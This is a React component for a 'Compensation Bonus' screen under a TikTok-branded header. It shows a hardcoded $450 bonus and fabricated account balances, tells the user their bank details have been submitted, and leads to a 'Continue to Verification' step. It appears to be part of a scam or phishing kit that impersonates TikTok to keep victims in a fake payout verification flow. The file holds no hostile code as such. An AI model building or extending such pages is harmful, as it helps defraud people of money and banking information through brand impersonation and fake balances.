import { useState, useEffect } from "react";
import { Gift, CheckCircle, ArrowRight } from "lucide-react";
import { Button } from "@/components/ui/button";
import TikTokHeader from "./TikTokHeader";

interface BonusScreenProps {
  userName: string;
  onContinue: () => void;
}

const BonusScreen = ({ userName, onContinue }: BonusScreenProps) => {
  const [showContent, setShowContent] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => setShowContent(true), 600);
    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <TikTokHeader showHelp />
      <div className="flex-1 px-6 py-6 flex flex-col">
        <p className="text-sm text-muted-foreground mb-1">
          Welcome back, <strong className="text-foreground">{userName}!</strong>
        </p>

        <div className={`flex-1 flex flex-col items-center justify-center text-center transition-all duration-700 ${
          showContent ? "opacity-100 translate-y-0" : "opacity-0 translate-y-4"
        }`}>
          {/* Gift icon with glow */}
          <div className="relative mb-6">
            <div className="absolute inset-0 bg-success/20 blur-2xl rounded-full scale-150" />
            <div className="relative w-20 h-20 rounded-full bg-gradient-to-br from-success/20 to-success/5 border-2 border-success/30 flex items-center justify-center">
              <Gift className="w-9 h-9 text-success" />
            </div>
          </div>

          <h2 className="text-2xl font-bold mb-2">Compensation Bonus</h2>
          <p className="text-sm text-muted-foreground mb-6 max-w-xs">
            We apologize for the verification delay. A compensation bonus has been added to your account balance.
          </p>

          {/* Bonus amount */}
          <div className="w-full rounded-2xl border border-success/30 bg-success/5 p-5 mb-5">
            <p className="text-[11px] uppercase tracking-widest text-success font-semibold mb-2">Bonus Credited</p>
            <p className="text-4xl font-bold text-success tracking-tighter">+$450.00</p>
          </div>

          {/* Updated balance */}
          <div className="w-full rounded-2xl border border-border/60 bg-card p-5 mb-6 space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs text-muted-foreground">Previous balance</span>
              <span className="text-sm font-medium line-through text-muted-foreground">$2,893.27</span>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-xs text-muted-foreground">Compensation bonus</span>
              <span className="text-sm font-semibold text-success">+$450.00</span>
            </div>
            <div className="h-px bg-border/40" />
            <div className="flex items-center justify-between">
              <span className="text-xs font-semibold">New balance</span>
              <span className="text-lg font-bold">$3,343.27</span>
            </div>
          </div>

          {/* Reassurance */}
          <div className="flex items-center gap-2 p-3 rounded-xl bg-secondary mb-6 w-full">
            <CheckCircle className="w-4 h-4 text-success shrink-0" />
            <p className="text-xs text-muted-foreground text-left">
              Your bank details have been submitted. Verification will restart immediately and your funds will be available soon.
            </p>
          </div>

          <Button onClick={onContinue} className="w-full h-14 rounded-full text-base font-semibold">
            Continue to Verification
            <ArrowRight className="w-4 h-4 ml-2" />
          </Button>
        </div>
      </div>
    </div>
  );
};

export default BonusScreen;
